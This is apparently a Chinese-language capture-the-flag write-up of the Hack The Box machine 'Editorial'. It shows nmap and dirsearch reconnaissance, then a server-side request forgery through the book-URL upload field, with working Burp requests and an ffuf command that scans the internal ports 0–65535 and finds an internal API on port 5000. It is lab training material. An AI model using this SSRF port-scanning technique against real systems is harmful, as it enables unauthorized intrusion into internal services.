nmap 結果
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

dirsearch 的結果
```
[22:51:28] Starting: 
[22:51:38] 200 -    3KB - /about                                            
[22:52:26] 200 -    7KB - /upload  
```

掃 subdomain 沒有找到東西
來看 /upload 頁面
![image](https://hackmd.io/_uploads/rkFNv8-Byg.png)

把請求都發過一遍後透過 burp 抓下來可以知道 Book information 都被 preview 控制 其他的被 sendbook info 控制
- preview 
上傳圖片會被修改檔名跟副檔名 所以不太能利用
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 72946
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryynSOq9ozAnlI8asf
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

------WebKitFormBoundaryynSOq9ozAnlI8asf
Content-Disposition: form-data; name="bookurl"

http://10.10.14.3:1234
------WebKitFormBoundaryynSOq9ozAnlI8asf
Content-Disposition: form-data; name="bookfile"; filename="Cat03.jpg"
Content-Type: image/jpeg

graph

------WebKitFormBoundaryynSOq9ozAnlI8asf--
```

但左邊可以上傳網址 先試看看能不能連線 成功後再試 SSRF 
![image](https://hackmd.io/_uploads/S1nUc8WSyg.png)

訪問 127.0.0.1 都是空的 去掃看看他的 port
做法 ： 
把 burp 的請求存成 txt 然後把 port 部分改成 fuzz
```java
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 302
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAQbSI1QUcvaMriAX
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

------WebKitFormBoundaryAQbSI1QUcvaMriAX
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundaryAQbSI1QUcvaMriAX
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryAQbSI1QUcvaMriAX--
```
再來因為要掃 port 所以存一個 port 的 txt
```
seq 0 65535 > port.txt
```
最後就是搭配 ffuf 做掃描
```
ffuf -u "http://editorial.htb/upload-cover" -X POST -request script.txt -w port.txt -fs 61
```

在 5000 port 找到
```
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 283ms]
```

於是去訪問 5000 port 會拿到一個 api 檔案
![image](https://hackmd.io/_uploads/rJytgDZHJx.png)

用 curl 搭配 jq 比較好看
```
curl http://editorial.htb/static/uploads/8c678572-de07-439c-aaaf-50d9ecb15053 | jq . | tee 1234.txt
```

```javascript
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
